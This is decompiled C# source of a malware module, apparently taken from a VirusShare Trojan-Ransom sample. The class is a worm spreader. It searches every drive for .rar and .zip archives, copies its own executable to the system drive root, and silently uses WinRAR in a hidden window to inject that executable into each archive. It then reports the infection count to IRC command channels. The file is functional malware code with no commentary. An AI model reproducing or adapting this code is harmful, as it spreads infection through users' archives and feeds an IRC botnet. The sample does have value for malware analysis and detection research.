// Decompiled with JetBrains decompiler
// Type: rundll32.spreaders.rarzip
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace rundll32.spreaders
{
  public class rarzip
  {
    public static int infectedArchives = 0;
    private static string _rarPath;
    private static string _copiedExeName;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern int GetShortPathName(
      [MarshalAs(UnmanagedType.LPTStr)] string path,
      [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath,
      int shortPathLength);

    private static void Search(string pathName)
    {
      foreach (string file in Directory.GetFiles(pathName))
      {
        if (file.Contains(".rar"))
          rarzip.RarStart(file);
        if (file.Contains(".zip"))
          rarzip.RarStart(file);
      }
      foreach (string directory in Directory.GetDirectories(pathName))
        rarzip.Search(directory);
    }

    public static void spread(string myExeName, irc irc)
    {
      rarzip._copiedExeName = myExeName;
      foreach (string logicalDrive in Environment.GetLogicalDrives())
        rarzip.Search(logicalDrive);
      foreach (string[] onConnChannel in config.onConnChannels)
        irc.sendMessage(onConnChannel[0], ".:RAR-ZIP:. - \u000308Infected \u000309" + rarzip.infectedArchives.ToString() + "\u000308 archives!");
    }

    private static void RarStart(string archiveToInject)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
      rarzip._rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
      if (File.Exists(rarzip._rarPath))
      {
        if (!File.Exists(Path.Combine(path1, rarzip._copiedExeName)))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, rarzip._copiedExeName));
        StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
        rarzip.GetShortPathName(Path.Combine(path1, rarzip._copiedExeName), shortPath1, shortPath1.Capacity);
        string str1 = shortPath1.ToString();
        StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
        rarzip.GetShortPathName(archiveToInject, shortPath2, shortPath2.Capacity);
        try
        {
          ProcessStartInfo startInfo = new ProcessStartInfo();
          string str2 = " a " + (object) shortPath2 + " " + str1;
          startInfo.FileName = rarzip._rarPath;
          startInfo.Arguments = str2;
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          Process.Start(startInfo);
          ++rarzip.infectedArchives;
        }
        catch
        {
        }
      }
      rarzip._rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Replace("Program Files", "Program Files (x86)") + "\\WinRAR\\WinRAR.exe";
      if (!File.Exists(rarzip._rarPath))
        return;
      if (!File.Exists(Path.Combine(path1, rarzip._copiedExeName)))
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, rarzip._copiedExeName));
      StringBuilder shortPath3 = new StringBuilder((int) byte.MaxValue);
      rarzip.GetShortPathName(Path.Combine(path1, rarzip._copiedExeName), shortPath3, shortPath3.Capacity);
      string str3 = shortPath3.ToString();
      StringBuilder shortPath4 = new StringBuilder((int) byte.MaxValue);
      rarzip.GetShortPathName(archiveToInject, shortPath4, shortPath4.Capacity);
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string str4 = " a " + (object) shortPath4 + " " + str3;
        startInfo.FileName = rarzip._rarPath;
        startInfo.Arguments = str4;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
        ++rarzip.infectedArchives;
      }
      catch
      {
      }
    }
  }
}
